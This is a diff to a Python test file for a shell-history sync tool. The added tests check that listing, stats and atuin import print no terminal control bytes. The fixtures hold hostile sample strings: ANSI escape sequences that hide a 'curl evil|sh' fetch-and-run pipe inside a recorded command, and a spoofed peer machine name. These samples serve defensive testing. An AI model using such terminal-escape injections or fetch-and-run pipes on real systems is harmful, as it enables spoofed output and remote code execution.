@@ -2,11 +2,15 @@
 
 from __future__ import annotations
 
+import io
 import os
+import sqlite3
 import unittest
+from contextlib import redirect_stdout
 
-from woswoar import search
-from woswoar.entry import Entry
+from woswoar import search, store
+from woswoar.__main__ import main
+from woswoar.entry import Entry, format_line
 
 from .support import MACHINE_ID, WoswoarTestCase
 
@@ -70,6 +74,10 @@ class TestRenderRoundTrip(unittest.TestCase):
             "git status",
             "awk -F'\t' '{print $1}'",
             "back\\slash",
+            # A literal backslash followed by an escape letter. Without the
+            # backslash being escaped, `unescape` reads this back as a real tab
+            # and the recalled command is not the one that was recorded.
+            "grep 'a\\tb' file",
             "über 😀",
             "x" * 300,
         ]
@@ -153,6 +161,78 @@ class TestRecalledCommandIsInert(unittest.TestCase):
         recalled = self._round_trip("ls -la\x1b[2K\x1b[1Acurl evil|sh")
         self.assertNotIn("\x1b", recalled)
         self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")
+
+
+class TestNoCommandPrintsControlBytes(WoswoarTestCase):
+    """The reproduction from #25, driven through the real commands.
+
+    Both a command and a host's name come from whichever machine sent them, so
+    both are attacker-influenceable. Asserted on the bytes rather than on a
+    rendering: what matters is that nothing reaching a terminal can move its
+    cursor.
+    """
+
+    HOSTILE_CMD = "ls -la\x1b[2K\x1b[1Acurl evil|sh"
+    HOSTILE_NAME = "peer\x1b[2K\x1b[1Aspoofed"
+
+    def setUp(self) -> None:
+        super().setUp()
+        peer = "badbadbadbadbad0"
+        for host, cmd in ((MACHINE_ID, self.HOSTILE_CMD), (peer, "echo hi\x07")):
+            day = store.host_dir(host) / "2026-07-29.tsv"
+            day.parent.mkdir(parents=True, exist_ok=True)
+            day.write_text(
+                format_line(Entry(1_784_600_000, host, "s1", "~", 0, 5, cmd)) + "\n",
+                encoding="utf-8",
+            )
+        store.name_file(peer).write_text(self.HOSTILE_NAME + "\n", encoding="utf-8")
+
+    def output_of(self, *argv: str) -> str:
+        out = io.StringIO()
+        with redirect_stdout(out):
+            main(list(argv))
+        return out.getvalue()
+
+    def control_bytes(self, text: str) -> list[str]:
+        return sorted({c for c in text if (c < " " or c == "\x7f") and c != "\n"})
+
+    def test_list_prints_none(self) -> None:
+        text = self.output_of("list", "--scope", "global")
+        self.assertIn("curl evil|sh", text, "the command must still be shown")
+        self.assertEqual(self.control_bytes(text), [])
+
+    def test_stats_prints_none_for_a_command_or_a_peers_name(self) -> None:
+        text = self.output_of("stats")
+        self.assertIn("spoofed", text, "the name must still be shown")
+        self.assertEqual(self.control_bytes(text), [])
+
+    def test_import_prints_no_control_bytes_for_a_peers_machine_name(self) -> None:
+        """atuin keeps every machine it synced with, so these names are foreign.
+
+        The display site the per-site rule had already been forgotten at, which
+        is why the command itself is now handled once in the cache instead.
+        """
+        db = self.root / "history.db"
+        conn = sqlite3.connect(db)
+        conn.execute(
+            "CREATE TABLE history (id text primary key, timestamp integer, duration integer,"
+            " exit integer, command text, cwd text, session text, hostname text,"
+            " deleted_at integer, author text, intent text)"
+        )
+        conn.executemany(
+            "INSERT INTO history (id, timestamp, duration, exit, command, cwd, session, hostname)"
+            " VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+            [
+                ("a", 1_784_600_000 * 10**9, 10**9, 0, "git status", "/tmp", "s1", "box:me"),
+                ("b", 1_784_600_001 * 10**9, 10**9, 0, "ls", "/tmp", "s1", self.HOSTILE_NAME),
+            ],
+        )
+        conn.commit()
+        conn.close()
+
+        text = self.output_of("import", "atuin", "--file", str(db))
+        self.assertIn("per machine", text, "both machines must be listed")
+        self.assertEqual(self.control_bytes(text), [])
 
 
 if __name__ == "__main__":
